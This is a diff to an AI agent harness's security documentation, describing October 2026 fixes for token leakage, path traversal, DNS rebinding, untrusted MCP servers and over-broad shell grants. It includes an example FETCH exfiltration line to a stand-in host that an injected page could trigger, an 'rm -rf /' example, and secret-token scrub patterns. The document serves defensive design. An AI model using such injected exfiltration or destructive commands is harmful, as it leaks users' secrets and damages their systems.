@@ -103,18 +103,113 @@ Then restart the bridge and reload the extension.
 - **The bridge refuses to bind off-loopback** (`bridge/server.mjs`): setting
   `AIPASS_HOST` to anything but `127.0.0.1`/`localhost`/`::1` without
   `AIPASS_ALLOW_REMOTE=1` exits instead of listening with no auth.
+- **The clients send the loopback token to loopback and nowhere else**
+  (hardened Oct 2026, `harness/authtoken.mjs` `isLoopbackUrl`). The question
+  is about the HOST, not about a string prefix: every client built its URL as
+  `${BRIDGE}${path}`, so "does this URL start with the bridge URL" was true by
+  construction and a remote `--bridge` shipped the token there. The token is
+  the cross-boundary credential — it is what stops another OS user, a
+  sandboxed app and a browser page — so it stays on the machine.
+- **The desktop backend answers a malformed request instead of dying**
+  (hardened Oct 2026, `harness/rpc.mjs`). The URL was parsed as the first
+  statement of an async listener, before the locality check: a malformed
+  request target threw, the rejection became an unhandled rejection, and the
+  process-level handler exited the backend. One request was enough, from any
+  local process and from any web page (a plain GET needs no preflight). It now
+  answers 400.
+- **A session handle is a handle, not a path** (hardened Oct 2026,
+  `harness/session.mjs` `resolveFile`). An id carrying a separator used to be
+  used as a raw path, so `session.delete` deleted whatever it named and
+  `session.rename` rewrote its first line. A handle may only name a file
+  inside the store, checked with `path.relative` — a string prefix would also
+  match a sibling whose name merely begins with the store's.
+- **The suite never touches your bridge port** (hardened Oct 2026,
+  `aipass-bridge/test/harness.mjs`). The suite turns the no-token escape hatch
+  on for its own bridges, and a CLI the suite runs auto-starts a bridge —
+  DETACHED, with the environment inherited. That bridge bound the developer's
+  real port 8787 with the token gate off and outlived the run, because its pid
+  landed in the suite's scratch home where `aipass stop` could not reach it: an
+  unauthenticated bridge squatting the real port, which any web page could
+  blind-POST to. The suite now names a port of its own and ends any bridge it
+  started.
+- **The shared port needs the token** (hardened Oct 2026,
+  `bridge/server.mjs`). `AIPASS_REQUIRE_AUTH=0` on the DEFAULT port 8787 is
+  refused: a cross-origin "simple" request needs no preflight, so the browser
+  sends it and the bridge acts on it, and the port is the only thing a web
+  page can guess. The no-token mode is for a foreground `aipass dev` and for
+  the test suite, and neither wants the shared port — on any other port it is
+  fine (`AIPASS_ALLOW_INSECURE_DEFAULT_PORT=1` says it on purpose).
+- **A fetch is a question, not a read** (hardened Oct 2026,
+  `harness/permissions.mjs` `EXFIL_KINDS`). FETCH is the one tool whose
+  DESTINATION the model chooses: the URL is its own, the query string is its
+  own, and `NEED file` followed by `FETCH https://elsewhere.example/x?t=…` is
+  a complete exfiltration channel — one a page the agent read could talk it
+  into. It is a tier of its own and no mode pre-answers it, yolo included; the
+  window asks and shows the URL. The CLI has no window to ask in, so
+  `--allow-fetch` is the consent there, the way `--allow-run` is for the
+  shell. WEB and ATTACH are not in the tier: WEB goes to the product's own
+  search and ATTACH to the provider that already receives the whole
+  conversation, and neither lets the model pick where the data lands.
+- **A repository cannot start a program on your machine** (hardened Oct 2026,
+  `harness/mcp.mjs`). A project-scoped `.aipass/mcp.json` used to be spawned
+  the moment the project was opened — no trust prompt, no allowlist, no
+  sandbox, with the harness's own environment (and its credentials) handed to
+  the child. A project-scoped server now runs only when its name is in the
+  `approved` list of the HOME `mcp.json` (the one file a repository cannot
+  write), it may not declare itself `read` (a repo file cannot talk itself
+  into the tier that never asks), and its child receives only the variables
+  its own config names.
+- **A "disabled" plugin does not run** (hardened Oct 2026,
+  `harness/plugins.mjs`). The enabled-list was checked AFTER the dynamic
+  import, so a disabled plugin's top-level code had already run — and that
+  is where a plugin does its damage. The list is read first now, so the file
+  is never imported.
+- **A remembered "always" is not a blanket** (hardened Oct 2026,
+  `harness/rules.mjs` `commandShape`, `harness/permissions.mjs`). A RUN
+  carries its command in its body and an empty argument, so the grant key was
+  the constant `run:` — one "always" on `ls -la` authorised `rm -rf /` after
+  it, in that run and in every run after it. A shell grant is keyed by the
+  command's SHAPE now (the program, and the word that decides what it does):
+  `git status` does not cover `git push`, and a grant written before the
+  shape existed answers nothing — the safe reading of "always allow every
+  command" is "ask again".
+- **`auto` asks about the shell** (hardened Oct 2026,
+  `harness/permissions.mjs`). The documented meaning of `auto` is "writes go
+  through without asking"; the code let `auto` + `allowRun` run every shell
+  command silently. `yolo` is the mode that lets the shell through.
+- **The private-address guard is pinned to the connection** (hardened Oct
+  2026, `bridge/private-hosts.mjs` `pinnedGet`). The guard resolved the name
+  and vetted the answer, then `fetch` resolved it AGAIN — so a name with
+  TTL=0 could answer public for the check and private for the request. The
+  address that was vetted is now the address the socket goes to, the verdict
+  cache is short, and the classifier knows the CGNAT, protocol-assignment,
+  benchmarking and reserved ranges as well as the IPv4-compatible and NAT64
+  IPv6 forms.
 - **Bridge logs are scrubbed** (`bridge/log-scrub.mjs` `scrubSecrets`): `sk-…`,
   `xox…`, `ghp/gho_…`, `AKIA…`, `AIza…` and `Bearer …` shapes are replaced
   with `[redacted]` before they reach stdout/`bridge.log`. Sessions on disk
   intentionally keep your own text verbatim — treat `~/.aipass/sessions` as
   sensitive and delete it when you decommission a machine.
-- **The desktop window runs under a CSP** (`desktop/src-tauri/tauri.conf.json`):
-  scripts/styles/images/fonts are local-only, `connect-src` is `self` + `ipc:`
-  + the loopback backend, `object-src`/`form-action` are locked down. The
-  Tauri capability set stays minimal (window + event only — no fs/shell/http),
-  the installer no longer ships the developer test suite, and the Chrome
-  extension's host access is the aipass origin plus the loopback bridge —
-  verified by tests so it cannot quietly re-broaden.
+- **The desktop window runs under a CSP.** The policy is served by the backend
+  (`harness/rpc.mjs`, `WINDOW_CSP`) and declared in
+  `desktop/src-tauri/tauri.conf.json`; a test says the two are the same
+  policy, key for key, because the window is loaded FROM the backend over
+  plain HTTP — the header the backend sends is the one that binds, and the
+  shell's declaration covers the asset protocol, which this window does not
+  use. Scripts come from the app itself (no inline, no eval), `object-src`
+  and `form-action` are locked down, the window cannot be framed, and
+  `connect-src` is the backend plus the loopback it is served from. The
+  Tauri capability set is window + event only (no fs/shell/http/tray/menu),
+  the page gets no `window.__TAURI__` at all, the installer no longer ships
+  the developer test suite, and the Chrome extension's host access is the
+  aipass origin plus the loopback bridge — verified by tests so it cannot
+  quietly re-broaden.
+- **An "always" answer is not a permanent yes.** The permission engine
+  checks the user's own path rules and the secret floor BEFORE the remembered
+  grants: a `deny` rule the person wrote after the grant wins over it, and a
+  secret file stays denied in every mode whatever the answer was once. The
+  grant still beats the safety floor and the mode — "always" means always
+  (`harness/permissions.mjs`, `test/permissions.test.mjs`).
 - **Every route needs the loopback bearer token** (Oct 2026,
   `harness/authtoken.mjs`): a 256-bit token is minted once to `~/.aipass/.token`
   (owner-only intent) and required on the bridge (8787) and the desktop
@@ -131,7 +226,17 @@ Then restart the bridge and reload the extension.
   confirmed (`--yes` exists for scripts and still prints the trust sentence),
   and validation *is* the first execution. The recorded hash is **provenance,
   not protection**: it answers "did this change since it behaved?", while the
-  stops remain the file system, the permission gate and the person. MCP tools
+  stops remain the file system, the permission gate and the person. A plugin
+  **marker** rides that gate like a built-in: the `risk` it declared at
+  registration is taken as given, and a marker that declared none is
+  classified like a **write** — a plugin's code runs in the backend process
+  with the app's rights, so silence is not a declaration of trust. The
+  person's own path rules and the secret floor reach a marker through its
+  argument, and the payload the argument does not carry (the body) is screened
+  for secret names as well, because a plugin used as a proxy would carry the
+  file straight back to the model and the plugin's own code cannot be screened
+  from here (`harness/permissions.mjs#classifyPlugin`, `harness/loop.mjs`).
+  MCP tools
   carry their server's declared `risk` (default `"write"`) into the same
   verdict a built-in of that kind faces — an MCP filesystem server may write,
   and in ask mode it is asked about; `"read"` is the operator's trust statement,
@@ -221,10 +326,13 @@ change. The honest residuals are the "Known limits" below.
   command.
 - Remote image URLs are fetched server-side behind a private-address guard. The
   guard understands IPv4 in every spelling the URL parser leaves (integer, hex,
-  octal and IPv4-mapped IPv6 forms) and re-checks every redirect hop. Since
-  Oct 2026 it also resolves bare domain names and refuses ones answering with
-  a private/loopback/link-local address (fail-open only when DNS itself is
-  unreachable) — still, do not point it at URLs you do not trust.
+  octal and IPv4-mapped IPv6 forms), re-checks every redirect hop, and since
+  Oct 2026 connects to the address it vetted rather than resolving the name a
+  second time — it also knows the CGNAT, protocol-assignment, benchmarking and
+  reserved ranges, and the IPv4-compatible and NAT64 IPv6 forms. It fails
+  CLOSED for a fetch (a name that cannot be vetted is not fetched); the
+  resolver helper the link-following path uses still fails open when DNS
+  itself is unreachable — still, do not point it at URLs you do not trust.
 - The loopback token file (`~/.aipass/.token`) is readable by your OS user: any
   process already running as you can read it — and could read your sessions
   anyway. The token stops other users, sandboxed apps and browser pages, not
